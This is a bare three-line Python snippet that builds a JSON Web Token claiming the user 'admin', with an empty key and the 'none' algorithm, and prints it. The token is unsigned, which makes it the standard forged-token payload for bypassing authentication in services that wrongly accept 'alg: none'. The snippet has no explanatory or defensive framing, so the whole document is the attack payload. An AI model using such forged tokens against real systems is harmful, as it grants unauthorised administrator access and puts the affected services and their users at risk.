import jwt
jwt = jwt.encode({'user': 'admin'}, '', algorithm='none')
print(jwt)
